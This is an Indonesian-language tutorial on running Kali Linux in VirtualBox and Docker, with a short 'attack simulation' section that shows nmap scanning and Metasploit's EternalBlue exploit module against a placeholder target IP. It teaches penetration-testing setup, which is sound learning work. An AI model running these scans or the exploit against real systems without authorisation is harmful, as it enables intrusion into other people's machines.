# **Hands-On: Kali Linux dengan VirtualBox**

#### 1. **Instalasi Kali Linux di VirtualBox/VMware**
   - **Langkah-langkah**:
     1. Unduh ISO Kali Linux dari situs resmi.
     2. Buat mesin virtual baru di VirtualBox/VMware.
     3. Mount ISO Kali Linux ke mesin virtual.
     4. Ikuti proses instalasi hingga selesai.
     5. Konfigurasi jaringan dan update sistem.

#### 2. **Simulasi Dasar Serangan Menggunakan Terminal Kali Linux**
   - **Contoh Simulasi**:
     - **Nmap Scanning**: Gunakan perintah `nmap` untuk memindai port pada target.
       ```bash
       nmap -sV <target_IP>
       ```
     - **Metasploit Framework**: Gunakan Metasploit untuk eksploitasi kerentanan.
       ```bash
       msfconsole
       use exploit/windows/smb/ms17_010_eternalblue
       set RHOSTS <target_IP>
       exploit
       ```
---

# **Hands-On: Kali Linux dengan Docker**

### **1. Instalasi Kali Linux dengan Docker**

#### **Langkah 1: Instal Docker**
1. **Untuk Ubuntu/Debian**:
   - Update sistem:
     ```bash
     sudo apt update && sudo apt upgrade -y
     ```
   - Instal Docker:
     ```bash
     sudo apt install docker.io
     ```
   - Mulai dan aktifkan Docker:
     ```bash
     sudo systemctl start docker
     sudo systemctl enable docker
     ```
   - Verifikasi instalasi:
     ```bash
     docker --version
     ```

2. **Untuk Windows/Mac**:
   - Unduh Docker Desktop dari situs resmi: [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop).
   - Ikuti proses instalasi dan mulai Docker Desktop.

---

#### **Langkah 2: Unduh Image Kali Linux dari Docker Hub**
1. Buka terminal atau command prompt.
2. Unduh image resmi Kali Linux dari Docker Hub:
   ```bash
   docker pull kalilinux/kali-rolling
   ```
3. Verifikasi bahwa image telah terunduh:
   ```bash
   docker images
   ```

---

#### **Langkah 3: Jalankan Container Kali Linux**
1. Jalankan container Kali Linux dengan akses terminal interaktif:
   ```bash
   docker run -it kalilinux/kali-rolling /bin/bash
   ```
   - Opsi `-it` memungkinkan Anda berinteraksi dengan terminal container.
   - `/bin/bash` memulai shell Bash di dalam container.

2. Setelah masuk ke container, Anda akan melihat prompt terminal Kali Linux.

---

#### **Langkah 4: Update dan Instal Tools di Container Kali Linux**
1. Update sistem:
   ```bash
   apt update && apt upgrade -y
   ```
2. Instal tools yang diperlukan, misalnya `nmap` dan `metasploit-framework`:
   ```bash
   apt install nmap metasploit-framework -y
   ```

---

### **2. Simulasi Dasar Serangan Menggunakan Terminal Kali Linux di Docker**

#### **Contoh 1: Nmap Scanning**
1. Jalankan perintah `nmap` untuk memindai port pada target:
   ```bash
   nmap -sV <target_IP>
   ```
   - Ganti `<target_IP>` dengan alamat IP target yang ingin Anda pindai.
   - Contoh:
     ```bash
     nmap -sV 192.168.1.1
     ```

---

#### **Contoh 2: Metasploit Framework**
1. Buka Metasploit Framework:
   ```bash
   msfconsole
   ```
2. Cari dan gunakan exploit, misalnya `ms17_010_eternalblue`:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```
3. Set target IP:
   ```bash
   set RHOSTS <target_IP>
   ```
   - Ganti `<target_IP>` dengan alamat IP target.
4. Jalankan exploit:
   ```bash
   exploit
   ```

---

### **3. Menyimpan Perubahan di Container Docker**
- Secara default, perubahan di container Docker bersifat sementara. Jika Anda ingin menyimpan perubahan (misalnya, tools yang telah diinstal), Anda dapat membuat image baru dari container yang sedang berjalan:
  1. Cari ID container yang sedang berjalan:
     ```bash
     docker ps
     ```
  2. Commit container ke image baru:
     ```bash
     docker commit <container_id> my-kali-image
     ```
     - Ganti `<container_id>` dengan ID container Anda.
  3. Verifikasi image baru:
     ```bash
     docker images
     ```

---

### **4. Menjalankan Container dengan Image yang Disimpan**
1. Jalankan container baru dengan image yang telah disimpan:
   ```bash
   docker run -it my-kali-image /bin/bash
   ```
2. Anda akan masuk ke container dengan semua tools yang telah diinstal sebelumnya.

---

### **5. Menghapus Container dan Image**
1. Hentikan container yang sedang berjalan:
   ```bash
   docker stop <container_id>
   ```
2. Hapus container:
   ```bash
   docker rm <container_id>
   ```
3. Hapus image:
   ```bash
   docker rmi <image_name>
   ```

---

### **Keuntungan Menggunakan Kali Linux dengan Docker**
- **Ringan**: Tidak perlu menginstal sistem operasi penuh.
- **Portabel**: Container dapat dijalankan di mana saja dengan Docker.
- **Isolasi**: Aman untuk eksperimen karena terisolasi dari sistem host.
- **Cepat**: Proses instalasi dan pengaturan lebih cepat dibandingkan virtual machine.

---

### **Referensi:**
- **Docker Documentation**: [https://docs.docker.com/](https://docs.docker.com/)
- **Kali Linux Docker Image**: [https://hub.docker.com/r/kalilinux/kali-rolling](https://hub.docker.com/r/kalilinux/kali-rolling)
- **Nmap Documentation**: [https://nmap.org/book/man.html](https://nmap.org/book/man.html)
- **Metasploit Documentation**: [https://docs.rapid7.com/metasploit/](https://docs.rapid7.com/metasploit/)
